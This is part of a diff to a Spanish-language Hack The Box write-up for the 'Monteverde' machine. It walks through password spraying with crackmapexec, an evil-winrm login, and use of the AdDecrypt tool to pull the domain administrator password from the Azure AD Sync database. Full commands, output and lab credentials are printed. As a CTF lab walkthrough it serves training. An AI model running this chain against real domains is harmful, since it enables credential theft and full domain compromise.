@@ -215,15 +215,125 @@ smb: \mhope\> get azure.xml
 <img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte5.jpg" width=80% />
 
 
+- El archivo AZURE.XML contiene una credencial. Vamos a probar ese password con todos los usuarios que tenemos.
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte6.jpg" width=80% />
+
+```
+┌──(root㉿kali)-[~/HT/MONTEVERDE]
+└─# crackmapexec smb 10.129.127.11 -u users.txt -p '4n0therD4y@n0th3r$' --shares --pass-pol
+SMB         10.129.127.11   445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
+SMB         10.129.127.11   445    MONTEVERDE       [+] Enumerated shares
+SMB         10.129.127.11   445    MONTEVERDE       Share           Permissions     Remark
+SMB         10.129.127.11   445    MONTEVERDE       -----           -----------     ------
+SMB         10.129.127.11   445    MONTEVERDE       ADMIN$                          Remote Admin
+SMB         10.129.127.11   445    MONTEVERDE       azure_uploads   READ            
+SMB         10.129.127.11   445    MONTEVERDE       C$                              Default share
+SMB         10.129.127.11   445    MONTEVERDE       E$                              Default share
+SMB         10.129.127.11   445    MONTEVERDE       IPC$            READ            Remote IPC
+SMB         10.129.127.11   445    MONTEVERDE       NETLOGON        READ            Logon server share 
+SMB         10.129.127.11   445    MONTEVERDE       SYSVOL          READ            Logon server share 
+SMB         10.129.127.11   445    MONTEVERDE       users$          READ            
+SMB         10.129.127.11   445    MONTEVERDE       [+] Dumping password info for domain: MEGABANK
+SMB         10.129.127.11   445    MONTEVERDE       Minimum password length: 7
+SMB         10.129.127.11   445    MONTEVERDE       Password history length: 24
+SMB         10.129.127.11   445    MONTEVERDE       Maximum password age: 41 days 23 hours 53 minutes 
+SMB         10.129.127.11   445    MONTEVERDE       
+SMB         10.129.127.11   445    MONTEVERDE       Password Complexity Flags: 000000
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Refuse Password Change: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Store Cleartext: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Lockout Admins: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password No Clear Change: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password No Anon Change: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Complex: 0
+SMB         10.129.127.11   445    MONTEVERDE       
+SMB         10.129.127.11   445    MONTEVERDE       Minimum password age: 1 day 4 minutes 
+SMB         10.129.127.11   445    MONTEVERDE       Reset Account Lockout Counter: 30 minutes 
+SMB         10.129.127.11   445    MONTEVERDE       Locked Account Duration: 30 minutes 
+SMB         10.129.127.11   445    MONTEVERDE       Account Lockout Threshold: None
+SMB         10.129.127.11   445    MONTEVERDE       Forced Log off Time: Not Set
+```
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte7.jpg" width=80% />
+
+- Encontramos usuario: mhope y password: 4n0therD4y@n0th3r$ 
+
+### 4.3. Conexión con EVIL-WINRM
+
+- https://github.com/Hackplayers/evil-winrm - WinRM (Windows Remote Management) TCP/5985
+
+```
+┌──(root㉿kali)-[~/HT/MONTEVERDE]
+└─# evil-winrm -i 10.129.127.11 -u mhope -p '4n0therD4y@n0th3r$'      
+```
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte8.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte9.jpg" width=80% />
+
+- Notamos que el usuario pertenece al grupo AZURE ADMIN y se ejecutan servicios de AZURE.
+
+## 5. Elevación de Privilegios
+
+- Si ejecutamos un whoami y services podemos notar servicios asociados a AZURE. No es común en un CTF encontrar estos servicios configurados.
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte10.jpg" width=80% />
+
+- La VM tiene instalado el servicio "Microsoft Azure AD SYNC", ese servicio sirve para sincronizar el AD local con el AD Azure en la nube.
+- Este servicio utiliza una BD MSSQL para la configuración y almacenar las credenciales de acceso y de conexión. Como la BD esta en local la cadena de conexión es conocidad, un investigador encontró las tablas y registros para obtener esta información sensible (Microsoft ya lo cambió). Aquí todo el detalle:  https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/
+
+- Subimos el binario y lo ejecutamos para no complicarnos mas.
+
+```
+*Evil-WinRM* PS C:\Users\mhope\Documents> upload /root/TOOLS/AdDecrypt/AdDecrypt.exe 
+Info: Uploading /root/TOOLS/AdDecrypt/AdDecrypt.exe to C:\Users\mhope\Documents\AdDecrypt.exe
+
+                                                             
+Data: 19796 bytes of 19796 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\mhope\Documents> upload /root/TOOLS/AdDecrypt/mcrypt.dll
+Info: Uploading /root/TOOLS/AdDecrypt/mcrypt.dll to C:\Users\mhope\Documents\mcrypt.dll
+
+                                                             
+Data: 445664 bytes of 445664 bytes copied
+
+Info: Upload successful!
+```
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte11.jpg" width=80% />
+
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft Azure Active Directory Connect> C:\Users\mhope\Documents\AdDecrypt.exe -fullSQL
+
+======================
+AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
+Based on original code from: https://github.com/fox-it/adconnectdump
+======================
+
+Opening database connection...
+Executing SQL commands...
+Closing database connection...
+Decrypting XML...
+Parsing XML...
+Finished!
+
+DECRYPTED CREDENTIALS:
+Username: administrator
+Password: d0m@in4dminyeah!
+Domain: MEGABANK.LOCAL
+
+```
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte12.jpg" width=80% />
+
+- Bingo, ya somos administradores!
 
 
-
-
-
-
-
-
-
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte13.jpg" width=80% />
 
 
 
